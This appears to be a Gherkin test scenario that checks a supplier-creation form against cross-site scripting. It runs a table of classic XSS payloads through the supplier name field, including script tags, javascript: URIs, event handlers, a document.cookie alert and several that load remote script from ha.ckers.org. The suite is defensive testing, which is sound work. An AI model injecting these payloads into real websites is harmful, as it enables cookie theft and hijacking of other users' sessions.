Meta:
@sprint_29
@xss

Scenario: XSS

Given the user opens supplier create page
And the user logs in as 'commercialManager'

When the user inputs value in supplierName field on supplier page
And the user clicks on the supplier create button

Then the user checks the supplier list contains element with value

Examples:
| value |
| '';!--"<XSS>=&{()} |
| <IMG SRC="javascript:alert('XSS');"> |
| <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> |
| <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"> |
| <IMG SRC="jav&#x09;ascript:alert('XSS');"> |
| perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out |
| <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT> |
| <IMG SRC="javascript:alert('XSS')" |
| </TITLE><SCRIPT>alert("XSS");</SCRIPT> |
| <BODY ONLOAD=alert('XSS')> |
| <BR SIZE="&{alert('XSS')}"> |
| <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"> |
| <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A> |
| <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"> |
| <SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT> |
| <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A> |
| <IMG SRC=# onmouseover="alert('xxs')"> |
| BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> |
| <iframe src=http://ha.ckers.org/scriptlet.html < |
| \";alert('XSS');// |
| <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> |
| <IMG DYNSRC="javascript:alert('XSS')"> |
| <IMG LOWSRC="javascript:alert('XSS')"> |
| <IMG SRC='vbscript:msgbox("XSS")'> |
| <LINK REL="stylesheet" HREF="javascript:alert('XSS');"> |
| <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"> |
| <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> |
| <XSS STYLE="xss:expression(alert('XSS'))"> |
| <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME> |
| <TABLE><TD BACKGROUND="javascript:alert('XSS')"> |
| <BASE HREF="javascript:alert('XSS');//"> |
| <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT> |
| <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT> |
| <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT> |
| <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT> |
| <A HREF="http://66.102.7.147/">XSS</A> |
| <A HREF="//www.google.com/">XSS</A> |
| <A HREF="javascript:document.location='http://www.google.com/'">XSS</A> |